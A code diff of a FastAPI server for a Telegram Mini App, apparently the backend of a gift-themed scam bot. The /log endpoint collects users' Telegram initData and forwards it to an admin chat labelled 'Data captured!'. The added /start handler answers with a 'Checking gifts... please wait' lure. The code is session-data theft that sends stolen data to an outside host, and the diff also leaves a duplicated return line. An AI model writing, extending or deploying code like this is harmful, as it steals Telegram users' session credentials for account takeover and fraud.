@@ -5,7 +5,7 @@ import os
 
 app = FastAPI()
 
-# Разрешаем Mini App отправлять данные на этот сервер
+# Разрешаем Mini App отправлять данные
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -14,9 +14,31 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Загружаем настройки из Environment Variables
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = os.getenv("ADMIN_ID")
+
+# --- НОВАЯ ЧАСТЬ ДЛЯ ОТВЕТА НА /START ---
+def send_telegram_msg(chat_id, text):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    requests.post(url, json={
+        "chat_id": chat_id,
+        "text": text,
+        "parse_mode": "Markdown"
+    })
+
+@app.post("/webhook") # Этот эндпоинт нужен для обработки сообщений
+async def webhook(request: Request):
+    data = await request.json()
+    if "message" in data:
+        chat_id = data["message"]["chat"]["id"]
+        text = data["message"].get("text", "")
+        
+        if text == "/start":
+            # Твой новый текст
+            msg = "Проверка подарков...\nПодождите, это займет некоторое время"
+            send_telegram_msg(chat_id, msg)
+    return {"status": "ok"}
+# ---------------------------------------
 
 @app.post("/log")
 async def log_data(request: Request):
@@ -24,15 +46,8 @@ async def log_data(request: Request):
         data = await request.json()
         init_data = data.get("initData")
         
-        # Отправляем уведомление в Telegram
         msg = f"✅ **Данные захвачены!**\n\n`{init_data}`"
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        
-        requests.post(url, json={
-            "chat_id": ADMIN_ID,
-            "text": msg,
-            "parse_mode": "Markdown"
-        })
+        send_telegram_msg(ADMIN_ID, msg)
         
         return {"status": "success"}
     except Exception as e:
@@ -40,4 +55,5 @@ async def log_data(request: Request):
 
 @app.get("/")
 async def root():
+    return {"message": "Server is running!"}
     return {"message": "Server is running!"}
